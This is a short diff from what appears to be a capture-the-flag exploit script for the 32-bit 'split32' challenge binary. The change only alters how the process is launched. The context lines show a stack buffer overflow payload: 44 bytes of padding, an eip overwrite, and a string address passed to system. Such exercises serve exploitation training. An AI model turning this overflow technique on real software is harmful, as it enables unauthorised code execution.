@@ -10,7 +10,7 @@ argSystem = p32(usefulStringAddr)
 
 crap = "A"* 44
 
-io = process("split32")
+io = e.process()
 
 io.sendline(crap + eip + argSystem)
 
